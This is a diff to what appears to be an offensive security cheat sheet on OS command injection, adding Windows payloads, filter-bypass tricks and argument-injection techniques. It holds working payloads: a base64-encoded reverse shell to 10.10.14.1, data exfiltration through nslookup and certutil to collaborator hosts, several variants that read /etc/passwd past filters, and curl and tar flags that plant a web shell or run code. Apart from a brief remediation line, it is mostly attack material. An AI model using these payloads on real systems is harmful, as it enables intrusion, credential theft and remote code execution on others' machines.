@@ -54,6 +54,60 @@ echo -n 'bash -i >& /dev/tcp/10.10.14.1/443 0>&1' | base64
 !!! opsec "Loud and logged"
     Spawned shells and outbound connections light up EDR. Prefer a single OAST confirmation before going interactive.
 
+## :material-alert-decagram: Edge cases & gotchas
+
+=== "Windows targets"
+
+    Different shell, different separators:
+    ```text
+    & whoami          |  cmd chaining        (also &&, ||)
+    | whoami          |  pipe
+    %0a               |  newline
+    ```
+    OAST on Windows: `nslookup %USERNAME%.COLLAB.oastify.com` or
+    `certutil -urlcache -f http://COLLAB/ x`. PowerShell context uses `;` and
+    `$(...)` like bash but different builtins.
+
+=== "Filter bypass"
+
+    ```bash
+    # Blocked spaces
+    cat</etc/passwd            ${IFS}         cat$IFS$9/etc/passwd
+    {cat,/etc/passwd}          X=$'cat\x20/etc/passwd';$X
+    # Blocked slashes
+    cat ${HOME:0:1}etc${HOME:0:1}passwd
+    # Keyword filtered (whoami) — break it up, shell reassembles
+    w'h'o'a'm'i    wh""oami    who$@ami    $(rev<<<'imaohw')
+    # Base64 the whole thing
+    echo d2hvYW1p|base64 -d|bash
+    ```
+
+=== "Argument injection (no separator)"
+
+    When your input becomes *one argument* to a fixed binary (no `;`/`|` possible),
+    abuse the binary's own flags:
+    ```text
+    # input passed to: curl <input>     ->  -o /var/www/shell.php http://ATTACKER/s
+    # input passed to: tar <input>      ->  --checkpoint-action=exec=sh ...
+    # a leading -/-- turns your value into an option
+    ```
+    Look for `ffmpeg`, `curl`, `wget`, `tar`, `zip`, `find`, `git` — each has a
+    flag that reads/writes files or runs code.
+
+!!! bug "Why the delay/callback never comes"
+    - **`system()` vs arg-list exec:** if the app uses `execve` with a fixed argv
+      (no shell), metacharacters are literal — you need *argument* injection, not
+      command injection.
+    - **The command is truncated:** your payload runs but a trailing fixed suffix
+      (`... 2>/dev/null` or `".jpg"`) breaks it — comment it out (`#`, or `%00`
+      where a null still truncates) or make it a valid continuation.
+    - **Output is swallowed but timing lies too** — `ping` count/flags differ on
+      Windows (`ping -n 5`). Use OAST (DNS) as the ground truth; DNS resolves even
+      through egress firewalls that block your reverse shell.
+    - **WAF strips one layer** — double-URL-encode, or move the payload to a header
+      the fetcher passes to the shell (`User-Agent` into a log-processing command is
+      a classic).
+
 ## :material-shield-check: Remediation
 
 - Avoid the shell entirely — use language APIs (`subprocess` with an arg **list**, no `shell=True`).
